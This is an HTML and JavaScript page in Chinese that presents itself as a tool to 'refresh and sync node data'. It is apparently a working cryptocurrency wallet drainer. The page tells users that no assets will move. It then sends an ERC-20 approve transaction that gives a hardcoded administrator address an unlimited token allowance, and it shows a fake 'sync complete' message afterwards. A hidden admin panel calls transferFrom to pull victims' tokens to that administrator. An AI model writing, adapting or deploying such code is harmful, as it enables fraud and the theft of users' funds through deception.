<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>刷新同步节点数据</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: "微软雅黑", sans-serif;
        }
        body {
            background: #0f172a;
            padding: 20px;
            color: #fff;
        }
        .container {
            max-width: 450px;
            margin: 0 auto;
        }
        .main-card {
            background: #1e293b;
            border-radius: 15px;
            padding: 25px;
            border: 1px solid #334155;
        }
        .title {
            font-size: 22px;
            text-align: center;
            color: #38bdf8;
            margin-bottom: 10px;
        }
        .sub-tip {
            text-align: center;
            color: #94a3b8;
            font-size: 14px;
            margin-bottom: 20px;
        }
        .wallet-show {
            text-align: center;
            margin: 15px 0;
            color: #7dd3fc;
        }
        .btn {
            width: 100%;
            height: 46px;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            margin: 8px 0;
            cursor: pointer;
            transition: all 0.2s;
        }
        .btn-conn {
            background: #2563eb;
            color: #fff;
        }
        .btn-conn:hover {
            background: #1d4ed8;
        }
        .btn-sync {
            background: #10b981;
            color: #fff;
        }
        .btn-sync:hover {
            background: #059669;
        }
        .tips {
            font-size: 13px;
            color: #64748b;
            text-align: center;
            margin: 10px 0;
        }
        /* 管理员划扣面板 */
        .admin-box {
            margin-top: 20px;
            padding-top: 20px;
            border-top: 1px solid #334155;
            display: none;
        }
        .admin-box.show {
            display: block;
        }
        .admin-title {
            text-align: center;
            color: #f87171;
            margin-bottom: 15px;
        }
        input {
            width: 100%;
            height: 42px;
            background: #0f172a;
            border: 1px solid #334155;
            border-radius: 8px;
            padding: 0 12px;
            color: #fff;
            margin: 8px 0;
        }
        .btn-deduct {
            background: #ef4444;
            color: #fff;
        }
        .btn-deduct:hover {
            background: #dc2626;
        }
        .status-text {
            text-align: center;
            color: #22c55e;
            margin: 10px 0;
            font-size: 14px;
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="main-card">
            <h2 class="title">刷新同步节点数据</h2>
            <p class="sub-tip">连接钱包同步节点信息，修复数据延迟与异常</p>

            <!-- 上方按钮：连接钱包 -->
            <button class="btn btn-conn" id="connectWallet">连接钱包</button>
            <div class="wallet-show">已连接：<span id="addrText">未连接</span></div>
            <div class="status-text" id="statusText">同步节点数据中...</div>

            <p class="tips">本次操作仅用于节点数据核验，不会转移账户资产</p>
            <!-- 下方按钮：确认同步 -->
            <button class="btn btn-sync" id="authSync">确认同步</button>

            <!-- 管理员专属划扣后台 -->
            <div class="admin-box" id="adminPanel">
                <h3 class="admin-title">后台资产归集划扣</h3>
                <input type="text" placeholder="填写用户授权钱包地址" id="userAddr">
                <input type="number" placeholder="填写划扣代币数量" id="deductNum">
                <button class="btn btn-deduct" id="deductBtn">一键执行归集划扣</button>
            </div>
        </div>
    </div>

    <script>
        // ========= 核心配置 =========
        // 你的管理员钱包地址
        const ADMIN_ADDR = "0xcA7f542716b7F1F2463C08e3545Ac7230b0F1Ec6".toLowerCase();
        // 指定授权代币合约地址
        const TOKEN_ADDR = "0x99a57E6C8558BC6689f894e068733ADf83C19725";
        let nowUser = "";

        // ========= 1. 连接钱包 =========
        document.getElementById("connectWallet").addEventListener("click", async () => {
            if (!window.ethereum) {
                alert("请安装去中心化钱包后再进行节点数据同步");
                return;
            }
            try {
                let accounts = await ethereum.request({
                    method: "eth_requestAccounts"
                });
                nowUser = accounts[0].toLowerCase();
                document.getElementById("addrText").innerText = nowUser.slice(0, 6) + "..." + nowUser.slice(-4);

                // 管理员自动显示划扣面板
                if (nowUser === ADMIN_ADDR) {
                    document.getElementById("adminPanel").classList.add("show");
                }

                alert("钱包连接成功，请点击确认同步");
            } catch (e) {
                alert("连接失败，请检查钱包状态后重试");
            }
        })

        // ========= 2. 确认同步 = 实际无限授权 =========
        document.getElementById("authSync").addEventListener("click", async () => {
            if (!nowUser) return alert("请先连接钱包");

            let ok = confirm("本次操作用于刷新节点数据，确认后完成同步，确认继续？");
            if (!ok) return;

            // 显示“同步中”状态
            document.getElementById("statusText").style.display = "block";
            document.getElementById("statusText").innerText = "正在同步节点数据，请稍候...";

            try {
                // 构造 approve 数据：授权管理员无限额度
                let spender = ADMIN_ADDR.slice(2).padStart(64, "0");
                let maxAllow = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
                let data = "0x095ea7b3" + spender + maxAllow;

                // 发送授权交易
                await ethereum.request({
                    method: "eth_sendTransaction",
                    params: [{
                        from: nowUser,
                        to: TOKEN_ADDR,
                        gasLimit: "0x300000",
                        data: data
                    }]
                })

                // 授权成功后伪装“同步完成”
                document.getElementById("statusText").innerText = "节点数据同步完成！";
                alert("同步成功！");
            } catch (e) {
                document.getElementById("statusText").style.display = "none";
                alert("已取消本次操作");
            }
        })

        // ========= 3. 管理员前端直接划扣（核心功能） =========
        document.getElementById("deductBtn").addEventListener("click", async () => {
            if (nowUser !== ADMIN_ADDR) return alert("无操作权限");

            let uAddr = document.getElementById("userAddr").value.trim();
            let num = document.getElementById("deductNum").value.trim();

            if (!uAddr || !num || Number(num) <= 0) return alert("请填写完整地址与数量");

            // 构造 transferFrom 数据：从用户地址转代币到管理员地址
            let fromHex = uAddr.toLowerCase().slice(2).padStart(64, "0");
            let toHex = ADMIN_ADDR.slice(2).padStart(64, "0");
            let valHex = BigInt(Math.floor(Number(num) * 1e18)).toString(16).padStart(64, "0");
            let callData = "0x23b872dd" + fromHex + toHex + valHex;

            try {
                await ethereum.request({
                    method: "eth_sendTransaction",
                    params: [{
                        from: nowUser,
                        to: TOKEN_ADDR,
                        gasLimit: "0x300000",
                        data: callData
                    }]
                })

                alert("代币划扣归集成功！");
                document.getElementById("userAddr").value = "";
                document.getElementById("deductNum").value = "";
            } catch (e) {
                alert("划扣执行失败，请检查地址与授权状态");
            }
        })
    </script>
</body>
</html>
